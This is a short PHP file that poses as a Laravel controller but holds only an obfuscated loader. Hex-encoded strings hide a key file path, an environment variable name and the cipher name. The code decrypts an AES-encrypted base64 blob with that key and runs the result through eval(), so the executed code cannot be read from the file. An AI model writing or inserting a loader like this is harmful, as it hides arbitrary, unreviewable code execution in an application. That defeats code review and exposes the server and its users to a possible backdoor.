<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('78DF2Vg6JBELq5fN4GgqJw==');

$c=base64_decode(

'/R+2N/pgI79+3NIxFmnyFV31P4ge3Zas1mnd1Hg2joMrSsEuRPoIiuIBBuqYSCf4RTj5TtgFkKUa' .
'rt47fDAxEwZ+VMRVTU7w2KEbGRLjHQp3BV5gCooNJB06BJbiWX6F4RMMXIQy4Z44OEHhYdEYYfyW' .
'vxNT1+r7YuWvPTrjQGobb6t4tAO3olpQoCBZPxRVkDz9QqX5B3PBBT1Q6KLBd9dnG69MDe/DCfjI' .
'a6eozK+jyqLb/5a49QsgHQFFvFzFn+SLcqBhoxsin+NQMUMQPw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

